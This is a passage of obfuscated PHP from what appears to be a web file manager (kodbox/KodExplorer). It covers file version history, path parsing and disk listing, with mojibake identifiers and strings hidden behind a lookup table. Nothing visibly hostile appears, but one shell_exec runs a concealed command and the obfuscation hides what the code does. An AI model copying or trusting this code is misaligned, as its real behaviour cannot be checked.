$ÛĞú±©ñ[$Åµ÷ÚÚ«[1278]], !1, $Òªùèû‹[$Åµ÷ÚÚ«[32]]); if (!$›ï·øü) { self::clearEmptyFolder($ÛĞú±©ñ[$Åµ÷ÚÚ«[1278]]); return !1; } array_unshift($Ÿß¨ºé¸, $Òªùèû‹); if (count($Ÿß¨ºé¸) > $–‹Ö™¢â) { $ü˜•ÊÒò = array_slice($Ÿß¨ºé¸, $–‹Ö™¢â); foreach ($ü˜•ÊÒò as $˜Íà„) { IO::remove($ÛĞú±©ñ[$Åµ÷ÚÚ«[1278]] . $˜Íà„[$Åµ÷ÚÚ«[32]]); } $Ÿß¨ºé¸ = array_slice($Ÿß¨ºé¸, 0, $–‹Ö™¢â); } return self::saveData($ÛĞú±©ñ[$Åµ÷ÚÚ«[1279]], $Ÿß¨ºé¸); } public static function remove($ƒ¥´£ÄÁ, $¿§”ğÒ¥) { $ÕäÕÈù› =& $_SERVER[ ÇƒŠìÀ]; $ÔëîßÚğ = self::listData($ƒ¥´£ÄÁ); $â³„ÁæĞ = array(); if (!$ÔëîßÚğ) { return !1; } foreach ($ÔëîßÚğ[$ÕäÕÈù›[415]] as $Û½³ßã·) { if ($Û½³ßã·[$ÕäÕÈù›[445]] == $¿§”ğÒ¥) { IO::remove($ÔëîßÚğ[$ÕäÕÈù›[1278]] . $Û½³ßã·[$ÕäÕÈù›[32]]); continue; } $â³„ÁæĞ[] = $Û½³ßã·; } return self::saveData($ÔëîßÚğ[$ÕäÕÈù›[1279]], $â³„ÁæĞ); } public static function clear($—–„ŞİĞ, $¨Š³¢ğ€ = true) { $èÑí¾İª =& $_SERVER[ ÇƒŠìÀ]; $‘¨¥ÒËê = self::listData($—–„ŞİĞ, $¨Š³¢ğ€); if (!$‘¨¥ÒËê) { return !1; } foreach ($‘¨¥ÒËê[$èÑí¾İª[415]] as $¤¨ÆõË¥) { IO::remove($‘¨¥ÒËê[$èÑí¾İª[1278]] . $¤¨ÆõË¥[$èÑí¾İª[32]]); } return self::saveData($‘¨¥ÒËê[$èÑí¾İª[1279]], array()); } public static function moveHistory($£ùî¡³, $óÇ„ÓĞí = '', $ˆÃ‰Ö…Ó = '') { $§ï³öæœ =& $_SERVER[ ÇƒŠìÀ]; $¦¶å¨ß = self::listData($£ùî¡³, !1); if (!$¦¶å¨ß || !$¦¶å¨ß[$§ï³öæœ[415]]) { return !1; } $æØÜÒÒ = $§ï³öæœ[1266]; $óÇ„ÓĞí = $óÇ„ÓĞí ? $óÇ„ÓĞí : get_path_this($£ùî¡³); $ˆÃ‰Ö…Ó = $ˆÃ‰Ö…Ó ? $ˆÃ‰Ö…Ó : $¦¶å¨ß[$§ï³öæœ[1278]]; $½…ºÊ¦Ô = substr(get_path_this($¦¶å¨ß[$§ï³öæœ[1279]]), 0, -strlen($æØÜÒÒ)); foreach ($¦¶å¨ß[$§ï³öæœ[415]] as $Ã¼‡¨¨ô => $°Œ§øÂ») { $ÍÃ€½Ò = $óÇ„ÓĞí . substr($°Œ§øÂ»[$§ï³öæœ[32]], strlen($½…ºÊ¦Ô)); $ÑÅì± = IO::move($¦¶å¨ß[$§ï³öæœ[1278]] . $°Œ§øÂ»[$§ï³öæœ[32]], $ˆÃ‰Ö…Ó, !1, $ÍÃ€½Ò); if ($ÑÅì±) { $¦¶å¨ß[$§ï³öæœ[415]][$Ã¼‡¨¨ô][$§ï³öæœ[32]] = $ÍÃ€½Ò; } } $¦¶å¨ß[$§ï³öæœ[1279]] = IO::move($¦¶å¨ß[$§ï³öæœ[1279]], $ˆÃ‰Ö…Ó, !1, $óÇ„ÓĞí . $æØÜÒÒ); self::saveData($¦¶å¨ß[$§ï³öæœ[1279]], $¦¶å¨ß[$§ï³öæœ[415]]); self::clearEmptyFolder($¦¶å¨ß[$§ï³öæœ[1278]]); } public static function rollback($±—«úÙ, $ŞèıÖ¬Ø) { $Ä˜ˆéĞõ =& $_SERVER[ ÇƒŠìÀ]; $ÊéïùÑî = self::listData($±—«úÙ); if (!$ÊéïùÑî) { return; } $¸İŸ¨ = IO::info($±—«úÙ); foreach ($ÊéïùÑî[$Ä˜ˆéĞõ[415]] as $š£‡Œõá => $¢ˆˆìÉÓ) { if ($¢ˆˆìÉÓ[$Ä˜ˆéĞõ[445]] == $ŞèıÖ¬Ø) { self::add($±—«úÙ); $¿‹ÖÒÈ‰ = $ÊéïùÑî[$Ä˜ˆéĞõ[1278]] . $¢ˆˆìÉÓ[$Ä˜ˆéĞõ[32]]; $ ƒÑº¦Ö = IO::copy($¿‹ÖÒÈ‰, IO::pathFather($±—«úÙ), REPEAT_REPLACE, $¸İŸ¨[$Ä˜ˆéĞõ[32]]); if ($ ƒÑº¦Ö) { self::remove($±—«úÙ, $ŞèıÖ¬Ø); } return $ ƒÑº¦Ö; } } return !1; } public static function setDetail($„­ŞƒÄ«, $Ï‡™¾, $‚´‹‚÷¨) { $›ƒƒ¢úÛ =& $_SERVER[ ÇƒŠìÀ]; $µŒ±¡£‹ = self::listData($„­ŞƒÄ«); if (!$µŒ±¡£‹) { return; } foreach ($µŒ±¡£‹[$›ƒƒ¢úÛ[415]] as $ÆìØÙƒ± => $ö–ÏÇÇ‡) { if ($ö–ÏÇÇ‡[$›ƒƒ¢úÛ[445]] == $Ï‡™¾) { $µŒ±¡£‹[$›ƒƒ¢úÛ[415]][$ÆìØÙƒ±][$›ƒƒ¢úÛ[1277]] = $‚´‹‚÷¨; self::saveData($µŒ±¡£‹[$›ƒƒ¢úÛ[1279]], $µŒ±¡£‹[$›ƒƒ¢úÛ[415]]); return !0; } } return !1; } public static function fileInfo($ÎÍ²±¶É, $û™Ö¥½) { $Ò÷­Š¸ =& $_SERVER[ ÇƒŠìÀ]; $–…¥¬´ = self::listData($ÎÍ²±¶É); if (!$–…¥¬´) { show_json(LNG($Ò÷­Š¸[107]), !1); } $á­Âè = $Ò÷­Š¸[12]; foreach ($–…¥¬´[$Ò÷­Š¸[415]] as $¥ªä§ĞØ => $À¸ ÙÈª) { if ($À¸ ÙÈª[$Ò÷­Š¸[445]] != $û™Ö¥½) { continue; } $á­Âè = $–…¥¬´[$Ò÷­Š¸[1278]] . $À¸ ÙÈª[$Ò÷­Š¸[32]]; break; } if (!$á­Âè) { show_json(LNG($Ò÷­Š¸[107]), !1); } return IO::info($á­Âè); } public static function fileOut($Î’»§›ş, $Ô»é¬˜—, $‰œúŠØä = false) { $€ŠÙïåÜ =& $_SERVER[ ÇƒŠìÀ]; $í•Çòê½ = self::fileInfo($Î’»§›ş, $Ô»é¬˜—); $›Ô£ï½ =& $GLOBALS[$€ŠÙïåÜ[7]]; $‰œúŠØä = isset($›Ô£ï½[$€ŠÙïåÜ[1229]]) && $›Ô£ï½[$€ŠÙïåÜ[1229]] == 1; if (isset($›Ô£ï½[$€ŠÙïåÜ[33]]) && $›Ô£ï½[$€ŠÙïåÜ[33]] == $€ŠÙïåÜ[1280]) { return IO::fileOutImage($í•Çòê½[$€ŠÙïåÜ[86]], $›Ô£ï½[$€ŠÙïåÜ[1281]]); } IO::fileOut($í•Çòê½[$€ŠÙïåÜ[86]], $‰œúŠØä, get_path_this($Î’»§›ş)); } public static function listData($‹õ¤æ±Í, $Ù¡×§´ˆ = true) { $Ø„Æ¶çš =& $_SERVER[ ÇƒŠìÀ]; if ($Ù¡×§´ˆ && !IO::exist($‹õ¤æ±Í)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($‹õ¤æ±Í, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ªüË¿ê« = self::pathHistory($‹õ¤æ±Í); $×ŞÄ¥’ = array($Ø„Æ¶çš[1279] => $ªüË¿ê« . $Ø„Æ¶çš[1266], $Ø„Æ¶çš[1278] => rtrim(get_path_father($ªüË¿ê«), $Ø„Æ¶çš[8]) . $Ø„Æ¶çš[8], $Ø„Æ¶çš[415] => array()); $ÁâÃºÏ£ = IO::getContent($×ŞÄ¥’[$Ø„Æ¶çš[1279]]); if ($ÁâÃºÏ£) { $ç–Õà›ò = json_decode($ÁâÃºÏ£, !0); if (is_array($ç–Õà›ò)) { $×ŞÄ¥’[$Ø„Æ¶çš[415]] = $ç–Õà›ò; } } return $×ŞÄ¥’; } private static function saveData($Âşë¿—€, $˜öˆ³÷ß) { $Æœç³Ãª =& $_SERVER[ ÇƒŠìÀ]; self::log($Æœç³Ãª[1282] . $Âşë¿—€ . $Æœç³Ãª[73] . count($˜öˆ³÷ß), $Æœç³Ãª[780]); if ($˜öˆ³÷ß) { return IO::setContent($Âşë¿—€, json_encode($˜öˆ³÷ß)); } $ëöû´ = IO::pathFather($Âşë¿—€); IO::remove($Âşë¿—€); self::clearEmptyFolder($ëöû´); return !0; } public static function clearEmptyFolder($óğ™í—¥) { $Êßùè¶è =& $_SERVER[ ÇƒŠìÀ]; if (trim($óğ™í—¥, $Êßùè¶è[8]) == trim(self::$_historyBase, $Êßùè¶è[8])) { return; } $úÎ×ÚŸÏ = IO::pathFather($óğ™í—¥); $ö‘ôÖÛÁ = IO::has($óğ™í—¥, !0); if ($ö‘ôÖÛÁ[$Êßùè¶è[225]] > 0 || $ö‘ôÖÛÁ[$Êßùè¶è[226]] > 0) { return; } IO::remove($óğ™í—¥); self::clearEmptyFolder($úÎ×ÚŸÏ); } private static function getBasePath() { $Éí×ÆŒÛ =& $_SERVER[ ÇƒŠìÀ]; $Áê¾ÄêÂ = Model($Éí×ÆŒÛ[1283])->get($Éí×ÆŒÛ[1284]); if ($Áê¾ÄêÂ) { if (!IO::exist($Áê¾ÄêÂ)) { IO::mkdir($Áê¾ÄêÂ); } if (get_path_this($Áê¾ÄêÂ) == $Éí×ÆŒÛ[1269]) { $ƒ§¾ƒš« = $Éí×ÆŒÛ[1285] . rand_string(8); @rename($Áê¾ÄêÂ, get_path_father($Áê¾ÄêÂ) . $Éí×ÆŒÛ[8] . $ƒ§¾ƒš«); $Áê¾ÄêÂ = DATA_PATH . $ƒ§¾ƒš« . $Éí×ÆŒÛ[8]; file_put_contents(DATA_PATH . $Éí×ÆŒÛ[1219], $Éí×ÆŒÛ[12]); Model($Éí×ÆŒÛ[1283])->set($Éí×ÆŒÛ[1284], $Áê¾ÄêÂ); } return $Áê¾ÄêÂ; } $Áê¾ÄêÂ = DATA_PATH . $Éí×ÆŒÛ[1285] . rand_string(8) . $Éí×ÆŒÛ[8]; $Áê¾ÄêÂ = IO::mkdir($Áê¾ÄêÂ); $Áê¾ÄêÂ = rtrim($Áê¾ÄêÂ, $Éí×ÆŒÛ[8]) . $Éí×ÆŒÛ[8]; file_put_contents($Áê¾ÄêÂ . $Éí×ÆŒÛ[1219], $Éí×ÆŒÛ[12]); file_put_contents(DATA_PATH . $Éí×ÆŒÛ[1219], $Éí×ÆŒÛ[12]); Model($Éí×ÆŒÛ[1283])->set($Éí×ÆŒÛ[1284], $Áê¾ÄêÂ); return $Áê¾ÄêÂ; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\x75\163\x65\162\x52\145\x63\171\x63\x6c\x65\175"; const KOD_USER_FAV = "\173\165\163\145\x72\106\x61\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\162\x46\x69\x6c\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\x75\163\145\162\x46\151\154\145\124\171\160\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\x67\162\x6f\165\160\x52\x6f\x6f\x74\x53\145\154\x66\175"; const KOD_USER_SHARE = "\x7b\165\x73\x65\x72\123\150\141\x72\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\x75\x73\145\x72\x53\150\x61\162\145\x4c\151\156\153\175"; const KOD_USER_SHARE_TO_ME = "\173\x73\150\x61\x72\145\x54\157\115\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\162\145\x49\x74\145\155\x7d"; const KOD_SHARE_LINK = "\173\x73\150\x61\x72\145\x49\x74\x65\155\x4c\151\x6e\x6b\175"; const KOD_SEARCH = "\x7b\163\x65\141\162\x63\x68\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\153\175"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\x65\x72\122\145\x6e\x63\x65\156\164\175"; const KOD_USER_DRIVER = "\x7b\144\x72\151\166\x65\162\175"; public static function typeList() { $ÜœÀ“£· =& $_SERVER[ ÇƒŠìÀ]; return array($ÜœÀ“£·[1286] => self::KOD_SOURCE, $ÜœÀ“£·[1287] => self::KOD_USER_RECYCLE, $ÜœÀ“£·[1288] => self::KOD_USER_FAV, $ÜœÀ“£·[1289] => self::KOD_USER_FILE_TAG, $ÜœÀ“£·[1290] => self::KOD_USER_FILE_TYPE, $ÜœÀ“£·[1291] => self::KOD_GROUP_ROOT_SELF, $ÜœÀ“£·[1292] => self::KOD_USER_SHARE, $ÜœÀ“£·[1293] => self::KOD_USER_SHARE_LINK, $ÜœÀ“£·[1294] => self::KOD_USER_SHARE_TO_ME, $ÜœÀ“£·[1295] => self::KOD_SHARE_ITEM, $ÜœÀ“£·[1296] => self::KOD_SHARE_LINK, $ÜœÀ“£·[1297] => self::KOD_SEARCH, $ÜœÀ“£·[1298] => self::KOD_BLOCK, $ÜœÀ“£·[1299] => self::KOD_IO, $ÜœÀ“£·[1300] => self::KOD_USER_RECENT, $ÜœÀ“£·[1301] => self::KOD_USER_DRIVER); } public static function parse($åœÕ§ë·) { $Ÿ™Ë”¶« =& $_SERVER[ ÇƒŠìÀ]; $åœÕ§ë· = self::clear($åœÕ§ë·); $´â˜«ªú = array_values(self::typeList()); preg_match($Ÿ™Ë”¶«[1302], $åœÕ§ë·, $©©¥îÔô); $·¥¬ˆş = array($Ÿ™Ë”¶«[466] => !1, $Ÿ™Ë”¶«[1303] => !1, $Ÿ™Ë”¶«[463] => !1, $Ÿ™Ë”¶«[86] => $åœÕ§ë·, $Ÿ™Ë”¶«[1204] => !1, $Ÿ™Ë”¶«[1203] => $Ÿ™Ë”¶«[12]); if (is_array($©©¥îÔô) && count($©©¥îÔô) == 5) { $±ó£ôº¾ = $Ÿ™Ë”¶«[1304] . $©©¥îÔô[2] . $Ÿ™Ë”¶«[373]; if (in_array($±ó£ôº¾, $´â˜«ªú)) { $·¥¬ˆş[$Ÿ™Ë”¶«[1204]] = $©©¥îÔô[1]; $·¥¬ˆş[$Ÿ™Ë”¶«[33]] = $±ó£ôº¾; $·¥¬ˆş[$Ÿ™Ë”¶«[1305]] = substr($±ó£ôº¾, 1, -1); $·¥¬ˆş[$Ÿ™Ë”¶«[445]] = $©©¥îÔô[3]; } $·¥¬ˆş[$Ÿ™Ë”¶«[1203]] = $©©¥îÔô[4]; } $£ß¨Ø³µ = array($Ÿ™Ë”¶«[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $·¥¬ˆş[$Ÿ™Ë”¶«[1268]] = in_array($·¥¬ˆş[$Ÿ™Ë”¶«[33]], $£ß¨Ø³µ); return $·¥¬ˆş; } public static function isTruePath($êÍø´õ˜) { $ááğåÖ¬ =& $_SERVER[ ÇƒŠìÀ]; if (substr($êÍø´õ˜, 0, 1) != $ááğåÖ¬[1304]) { return !0; } if (strpos($êÍø´õ˜, $ááğåÖ¬[453]) === 0) { return !0; } if (strpos($êÍø´õ˜, $ááğåÖ¬[1272]) === 0) { return !0; } if (strpos($êÍø´õ˜, $ááğåÖ¬[1306]) === 0) { return !0; } if (strpos($êÍø´õ˜, $ááğåÖ¬[1307]) === 0) { return !0; } if (strpos($êÍø´õ˜, $ááğåÖ¬[1308]) === 0) { return !0; } return !1; } public static function clear($ ®§“¥å) { $±ùùà®¡ =& $_SERVER[ ÇƒŠìÀ]; $ ®§“¥å = str_replace(array($±ùùà®¡[1113], $±ùùà®¡[248]), $±ùùà®¡[53], $ ®§“¥å); $ ®§“¥å = str_replace($±ùùà®¡[99], $±ùùà®¡[8], $ ®§“¥å); $¯ê«Æã‡ = $±ùùà®¡[1309]; if (substr($ ®§“¥å, 0, 3) == $±ùùà®¡[1310]) { $ ®§“¥å = substr($ ®§“¥å, 3); } while (strstr($ ®§“¥å, $¯ê«Æã‡)) { $ ®§“¥å = str_replace($¯ê«Æã‡, $±ùùà®¡[8], $ ®§“¥å); } $ ®§“¥å = preg_replace($±ùùà®¡[1311], $±ùùà®¡[8], $ ®§“¥å); if ($ ®§“¥å == $±ùùà®¡[8]) { return $±ùùà®¡[8]; } $ ®§“¥å = rtrim($ ®§“¥å, $±ùùà®¡[8]); return $ ®§“¥å; } public static function pathTrue($¡¾²Ú–Ø) { $ÔŠøÒÁ§ =& $_SERVER[ ÇƒŠìÀ]; if (!$¡¾²Ú–Ø) { return $ÔŠøÒÁ§[12]; } $¡¾²Ú–Ø = str_replace($ÔŠøÒÁ§[563], $ÔŠøÒÁ§[8], str_replace($ÔŠøÒÁ§[1312], $ÔŠøÒÁ§[8], $¡¾²Ú–Ø)); $¡¾²Ú–Ø = str_replace($ÔŠøÒÁ§[563], $ÔŠøÒÁ§[8], str_replace($ÔŠøÒÁ§[1312], $ÔŠøÒÁ§[8], $¡¾²Ú–Ø)); if (!strstr($¡¾²Ú–Ø, $ÔŠøÒÁ§[1310])) { return $¡¾²Ú–Ø; } $²ş©Ù•Œ = explode($ÔŠøÒÁ§[8], $¡¾²Ú–Ø); foreach ($²ş©Ù•Œ as $É¸œú”Ş => $øŞÈºÈ¨) { if ($øŞÈºÈ¨ !== $ÔŠøÒÁ§[1313]) { continue; } for ($éÌ­íòÙ = $É¸œú”Ş; $éÌ­íòÙ >= 0; $éÌ­íòÙ--) { if ($²ş©Ù•Œ[$éÌ­íòÙ] === $ÔŠøÒÁ§[10] || $²ş©Ù•Œ[$éÌ­íòÙ] === $ÔŠøÒÁ§[1313] || $²ş©Ù•Œ[$éÌ­íòÙ] === -1) { continue; } if ($²ş©Ù•Œ[$éÌ­íòÙ] === $ÔŠøÒÁ§[12]) { $²ş©Ù•Œ[$É¸œú”Ş] = -1; break; } $²ş©Ù•Œ[$É¸œú”Ş] = -1; $²ş©Ù•Œ[$éÌ­íòÙ] = -1; break; } } $²ş‚Óˆ = array(); foreach ($²ş©Ù•Œ as $øŞÈºÈ¨) { if ($øŞÈºÈ¨ !== -1) { $²ş‚Óˆ[] = $øŞÈºÈ¨; } } $Ñ‚•õø‘ = implode($ÔŠøÒÁ§[8], $²ş‚Óˆ); if (strpos($Ñ‚•õø‘, $ÔŠøÒÁ§[1314]) === 0) { $Ñ‚•õø‘ = $ÔŠøÒÁ§[1310] . substr($Ñ‚•õø‘, strlen($ÔŠøÒÁ§[1314])); } return $Ñ‚•õø‘; } public static function sourceID($ûû«÷Ä) { $ù¡ı¶¡ =& $_SERVER[ ÇƒŠìÀ]; $õº˜™¼ = self::parse($ûû«÷Ä); if ($õº˜™¼[$ù¡ı¶¡[33]] !== self::KOD_SOURCE) { show_json(LNG($ù¡ı¶¡[1315]), !1); } return $õº˜™¼[$ù¡ı¶¡[445]]; } public static function make($î¾¾÷¤ó) { if (!$î¾¾÷¤ó) { return !1; } return self::makePath(self::KOD_SOURCE, intval($î¾¾÷¤ó)); } public static function makeShare($‡ˆ…İşü, $–çÀ¶) { return self::makePath(self::KOD_SHARE_ITEM, $‡ˆ…İşü, $–çÀ¶); } public static function makeFileTypePath($î¾šêĞĞ) { return self::makePath(self::KOD_USER_FILE_TYPE, $î¾šêĞĞ); } public static function makeFileTagPath($‘¬º¯Ä) { return self::makePath(self::KOD_USER_FILE_TAG, $‘¬º¯Ä); } public static function makePath($·ğ²’ˆ·, $×ËÑ´œÀ = '', $á¦·Î›Ü = '') { $ëúù°‘¾ =& $_SERVER[ ÇƒŠìÀ]; $›Ô…É‚ç = substr($·ğ²’ˆ·, 1, -1); $¯”â¦’ = $ëúù°‘¾[1316] . $›Ô…É‚ç . $ëúù°‘¾[1317] . $×ËÑ´œÀ . $ëúù°‘¾[1318]; $¯”â¦’ = $á¦·Î›Ü ? $¯”â¦’ . $á¦·Î›Ü . $ëúù°‘¾[8] : $¯”â¦’; return $¯”â¦’; } public static function hashPath($Ï¿Ú‘ñ¾, $¥¨›Í·å = true) { $ìë¬Üóª =& $_SERVER[ ÇƒŠìÀ]; $›æÁ¿ = is_array($Ï¿Ú‘ñ¾) ? $Ï¿Ú‘ñ¾ : IO::info($Ï¿Ú‘ñ¾); $œ¼áŠÈ = _get($›æÁ¿, $ìë¬Üóª[1319], $ìë¬Üóª[12]); if (!$œ¼áŠÈ && isset($›æÁ¿[$ìë¬Üóª[221]])) { $œ¼áŠÈ = trim($›æÁ¿[$ìë¬Üóª[221]], $ìë¬Üóª[120]); } if (!$œ¼áŠÈ && isset($›æÁ¿[$ìë¬Üóª[183]]) && $›æÁ¿[$ìë¬Üóª[183]]) { $›æÁ¿ = IO::info(KodIO::make($›æÁ¿[$ìë¬Üóª[183]])); $œ¼áŠÈ = _get($›æÁ¿, $ìë¬Üóª[1319], $ìë¬Üóª[12]); } $¹áÌ˜ªš = md5($›æÁ¿[$ìë¬Üóª[86]] . $›æÁ¿[$ìë¬Üóª[78]] . $›æÁ¿[$ìë¬Üóª[87]]); if (!$œ¼áŠÈ && file_exists($›æÁ¿[$ìë¬Üóª[86]])) { $œ¼áŠÈ = Cache::get($¹áÌ˜ªš . $ìë¬Üóª[1320]); $œ¼áŠÈ = !1; if (!$œ¼áŠÈ) { $œ¼áŠÈ = IO::hashSimple($›æÁ¿[$ìë¬Üóª[86]]); Cache::set($¹áÌ˜ªš . $ìë¬Üóª[1320], $œ¼áŠÈ, 3600 * 24 * 30); } } if ($¥¨›Í·å && !$œ¼áŠÈ) { } return $œ¼áŠÈ ? $œ¼áŠÈ : $¹áÌ˜ªš; } public static function hashPathSafe($Ìûıíê¯, $ÙÄõ¨‹Ö = true) { $öôÙÓÂÛ =& $_SERVER[ ÇƒŠìÀ]; $«šŞÚ‹ = self::hashPath($Ìûıíê¯, $ÙÄõ¨‹Ö); return md5($«šŞÚ‹ . $öôÙÓÂÛ[1321] . Model($öôÙÓÂÛ[799])->get($öôÙÓÂÛ[800])); } public static function initSystemPath() { $‘ôôŒ‡‘ =& $_SERVER[ ÇƒŠìÀ]; if (defined($‘ôôŒ‡‘[1322])) { return; } define($‘ôôŒ‡‘[1322], self::systemPath($‘ôôŒ‡‘[181])); define($‘ôôŒ‡‘[1323], self::systemPath($‘ôôŒ‡‘[1324])); define($‘ôôŒ‡‘[1325], self::systemPath($‘ôôŒ‡‘[1326])); define($‘ôôŒ‡‘[1327], self::systemPath($‘ôôŒ‡‘[1328])); IOHistory::bindEvent(); } public static function systemPath($¡“¼ğ¥¯) { $÷“õÈ— =& $_SERVER[ ÇƒŠìÀ]; $ªñşşíä = $÷“õÈ—[1329] . ucfirst($¡“¼ğ¥¯); $ƒÁ³ËÙ = Model($÷“õÈ—[799])->get($ªñşşíä); if ($ƒÁ³ËÙ) { return $ƒÁ³ËÙ; } if ($¡“¼ğ¥¯ == $÷“õÈ—[181]) { $ƒÁ³ËÙ = self::make(Model($÷“õÈ—[854])->systemRootPathAdd($÷“õÈ—[576])); } else { $ƒÁ³ËÙ = self::systemPath($÷“õÈ—[181]); $Öü¡‡ì = self::sourceID($ƒÁ³ËÙ); $ƒÁ³ËÙ = self::make(Model($÷“õÈ—[854])->mkdir($Öü¡‡ì, $¡“¼ğ¥¯)); } Model($÷“õÈ—[799])->set($ªñşşíä, $ƒÁ³ËÙ); return $ƒÁ³ËÙ; } public static function systemFolder($‰ÃºÛàã) { $óÎÈÓ— = IO_PATH_SYSTEM_SOURCE . $‰ÃºÛàã; $–“ŸÌóÇ = Cache::get($óÎÈÓ—); if (!$–“ŸÌóÇ) { $¯¾î—äØ = IO::infoFullSimple($óÎÈÓ—); if (!$¯¾î—äØ) { $–“ŸÌóÇ = IO::mkdir($óÎÈÓ—, REPEAT_SKIP); } else { $–“ŸÌóÇ = $¯¾î—äØ[$_SERVER[ ÇƒŠìÀ][86]]; } Cache::set($óÎÈÓ—, $–“ŸÌóÇ, 3600 * 10); } return $–“ŸÌóÇ; } public static function defaultDriver() { return Model($_SERVER[ ÇƒŠìÀ][796])->defaultDriver(); } public static function defaultIO() { $™‰—š÷• =& $_SERVER[ ÇƒŠìÀ]; $¹È¤ŸøÆ = self::defaultDriver(); return $™‰—š÷•[1330] . $¹È¤ŸøÆ[$™‰—š÷•[445]] . $™‰—š÷•[1318]; } public static function defaultDriverInit() { static $¼À“¤€¯ = false; if ($¼À“¤€¯) { return $¼À“¤€¯; } $¼À“¤€¯ = IO::init(self::defaultIO()); return $¼À“¤€¯; } public static function fileTypeList() { $å˜Ö¾ =& $_SERVER[ ÇƒŠìÀ]; $¾å¤Õ¤© = $GLOBALS[$å˜Ö¾[6]][$å˜Ö¾[1331]]; foreach ($¾å¤Õ¤© as $‘é¢‹÷ => $êŠƒ§Ø) { $ç³á½öı = $å˜Ö¾[1332] . $‘é¢‹÷; $¬ãá•îî = LNG($ç³á½öı); if ($ç³á½öı != $¬ãá•îî) { $¾å¤Õ¤©[$‘é¢‹÷][$å˜Ö¾[32]] = $¬ãá•îî; } } return $¾å¤Õ¤©; } public static function diskList($ˆ¾¯É = true) { $®ıÂ´ê± = $_SERVER[ ÇƒŠìÀ][1333]; if ($ˆ¾¯É) { $·ÑÄÊù = Cache::get($®ıÂ´ê±); if (is_array($·ÑÄÊù)) { return $·ÑÄÊù; } } $·ÑÄÊù = self::diskListGet(); Cache::set($®ıÂ´ê±, $·ÑÄÊù, 60); return $·ÑÄÊù; } public static function diskListGet() { $ôî™„œë =& $_SERVER[ ÇƒŠìÀ]; $†Ó×æÚÊ = array(); if ($GLOBALS[$ôî™„œë[6]][$ôî™„œë[1334]] == $ôî™„œë[1335]) { $ì¯ôöõ = $ôî™„œë[1336]; for ($ÀÔ‘ˆÁÍ = 0; $ÀÔ‘ˆÁÍ < strlen($ì¯ôöõ); $ÀÔ‘ˆÁÍ++) { $Í®Àøø = $ì¯ôöõ[$ÀÔ‘ˆÁÍ] . $ôî™„œë[1337]; if (file_exists($Í®Àøø)) { $†Ó×æÚÊ[] = $Í®Àøø; } } return $†Ó×æÚÊ; } if (!function_exists($ôî™„œë[100])) { $†Ó×æÚÊ[] = $ôî™„œë[865]; return $†Ó×æÚÊ; } $àºşÓï… = explode($ôî™„œë[248], shell_exec($ôî™„œë[1338])); array_shift($àºşÓï…); array_pop($àºşÓï…); $†âğàÛ¡ = array($ôî™„œë[1339], $ôî™„œë[1340], $ôî™„œë[1341], $ôî™„œë[1342], $ôî™„œë[1343], $ôî™„œë[1344], $ôî™„œë[1345], $ôî™„œë[1346]); foreach ($àºşÓï… as $‡ËÜ†Ù¥) { $É¿¥¤‰´ = preg_split($ôî™„œë[1347], $‡ËÜ†Ù¥); $Í®Àøø = $É¿¥¤‰´[count($É¿¥¤‰´) - 1]; if (!strstr($É¿¥¤‰´[0], $ôî™„œë[1348]) || !$Í®Àøø) { continue; } $‡Ç™æ¦è = rtrim($Í®Àøø, $ôî™„œë[8]) . $ôî™„œë[8]; if (in_array($‡Ç™æ¦è, $†âğàÛ¡)) { continue; } $†Ó×æÚÊ[] = $‡Ç™æ¦è; } return $†Ó×æÚÊ; } public static function isSameDisk($ßÓ’ºŒ, $ÛŸ £Ä») { $„°˜ÔÂ =& $_SERVER[ ÇƒŠìÀ]; if ($GLOBALS[$„°˜ÔÂ[6]][$„°˜ÔÂ[1334]] == $„°˜ÔÂ[1335]) { return strtolower(substr($ßÓ’ºŒ, 0, 1)) == strtolower(substr($ÛŸ £Ä», 0, 1)); } $¤³•‚¨ê = self::diskList(); $ÚåÌŒ÷ = !1; $Œğ¥õâí = !1; sort($¤³•‚¨ê); $¤³•‚¨ê = array_reverse($¤³•‚¨ê); $ßÓ’ºŒ = rtrim($ßÓ’ºŒ, $„°˜ÔÂ[8]) . $„°˜ÔÂ[8]; $ÛŸ £Ä» = rtrim($ÛŸ £Ä», $„°˜ÔÂ[8]) . $„°˜ÔÂ[8]; foreach ($¤³•‚¨ê as $üä°±âÂ) { $“áäƒ¦ã = strlen($üä°±âÂ); if (!$ÚåÌŒ÷ && substr($ßÓ’ºŒ, 0, $“áäƒ¦ã) == $üä°±âÂ) { $ÚåÌŒ÷ = $üä°±âÂ; } if (!$Œğ¥õâí && substr($ÛŸ £Ä», 0, $“áäƒ¦ã) == $üä°±âÂ) { $Œğ¥õâí = $üä°±âÂ; } if ($ÚåÌŒ÷ && $Œğ¥õâí) { break; } } return $ÚåÌŒ÷ === $Œğ¥õâí; } public static function transferType($¼Ğõ¶ó, $…’îÈğ¢) { $Œ¦á»™ï =& $_SERVER[ ÇƒŠìÀ]; $—×Ê£ŸŠ = self::driverType($¼Ğõ¶ó); $×üò¸û“ = self::driverType($…’îÈğ¢); if ($—×Ê£ŸŠ[$Œ¦á»™ï[33]] == $×üò¸û“[$Œ¦á»™ï[33]] && $—×Ê£ŸŠ[$Œ¦á»™ï[1349]] == $×üò¸û“[$Œ¦á»™ï[1349]]) { return $Œ¦á»™ï[1350]; } if ($—×Ê£ŸŠ[$Œ¦á»™ï[33]] == $Œ¦á»™ï[898] && $×üò¸û“[$Œ¦á»™ï[33]] == $Œ¦á»™ï[108]) { return $Œ¦á»™ï[1229]; } if ($—×Ê£ŸŠ[$Œ¦á»™ï[33]] == $Œ¦á»™ï[108] && $×üò¸û“[$Œ¦á»™ï[33]] == $Œ¦á»™ï[898]) { return $Œ¦á»™ï[109]; } return $Œ¦á»™ï[1351]; } public static function driverType($óŒúù÷¬) { $ØÎË¸ =& 